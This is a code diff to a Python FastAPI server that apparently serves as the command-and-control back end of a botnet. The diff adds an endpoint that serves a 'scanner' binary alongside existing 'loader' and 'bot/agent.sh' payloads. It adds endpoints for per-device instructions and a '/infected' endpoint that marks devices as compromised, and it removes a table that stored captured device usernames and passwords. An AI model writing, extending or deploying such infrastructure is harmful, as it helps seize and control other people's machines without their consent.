@@ -40,49 +40,6 @@ def get_con():
     con.execute("PRAGMA journal_mode=WAL")  # safe for multi-process shared DB
     return con
 
-
-def db_init():
-    con = get_con()
-    con.executescript("""
-        -- dont know if this is here, because report_server.py should create this
-        CREATE TABLE IF NOT EXISTS devices (
-            device_id   TEXT PRIMARY KEY,
-            ip          TEXT,
-            port        TEXT,
-            username    TEXT,
-            password    TEXT,
-            arch        TEXT,
-            cpu_load    REAL,
-            memory      REAL,
-            uptime      REAL,
-            first_seen  TEXT,
-            last_seen   TEXT
-        );
-
-        CREATE TABLE IF NOT EXISTS tasks (
-            id          INTEGER PRIMARY KEY AUTOINCREMENT,
-            device_id   TEXT NOT NULL,
-            task        TEXT NOT NULL,   -- PING | SLEEP | BENCHMARK
-            status      TEXT NOT NULL DEFAULT 'pending',
-            created_at  TEXT NOT NULL
-        );
-        
-        -- Append-only results log
-        CREATE TABLE IF NOT EXISTS results (
-            id          INTEGER PRIMARY KEY AUTOINCREMENT,
-            task_id     TEXT NOT NULL,
-            device_id   TEXT NOT NULL,
-            result      TEXT NOT NULL,
-            received_at TEXT NOT NULL
-        );
-    """)
-    con.commit()
-    con.close()
-
-
-db_init()
-
-
 # ─────────────────────────────────────────
 # Helpers
 # ─────────────────────────────────────────
@@ -222,9 +179,18 @@ def get_payload(device_id: str):
             filename="loader_amd64"
             )
 
+@app.get("/payload/scanner")
+def get_payload(device_id: str):
+    binary_path = os.path.join(this_path, "../bin/scanner_amd64")
+    return FileResponse(
+            path=binary_path,
+            media_type="application/octet-stream",
+            filename="scanner_amd64"
+            )
+
 @app.get("/payload/agent")
 def get_payload(device_id: str):
-    binary_path = os.path.join(this_path, "../device/agent.sh")
+    binary_path = os.path.join(this_path, "../bot/agent.sh")
     return FileResponse(
             path=binary_path,
             media_type="application/octet-stream",
@@ -261,6 +227,7 @@ def post_busy(busystatus: int, device_id: str):
         WHERE device_id = ?
     """, [busystatus, device_id])
     con.commit()
+    con.close()
 
 # this is just a transparent way for the agent to access the current instruction in the db for them
 @app.get("/inst")
@@ -268,10 +235,33 @@ def get_inst(device_id: str):
     con = get_con()
     instruction = con.execute("""
         SELECT instruction
-        FROM devices
-        WHERE device_id = (?)
+        FROM instructions
+        WHERE device_id = (?) AND status = 0
     """, [device_id]).fetchone()
+    con.close()
     return instruction
+
+@app.post("/inst")
+def post_inst(device_id: str, status: int):
+    con = get_con()
+    con.execute("""
+        UPDATE instructions
+        SET status = (?)
+        WHERE device_id = (?)
+    """, [status, device_id])
+    con.commit()
+    con.close()
+
+@app.post("/infected")
+def post_infected(device_id: str):
+    con = get_con()
+    con.execute("""
+        UPDATE devices
+        SET infected = 1
+        WHERE device_id = ?
+    """, [device_id])
+    con.commit()
+    con.close()
 
 @app.post("/result", status_code=204)
 def post_result(payload: ResultPayload):
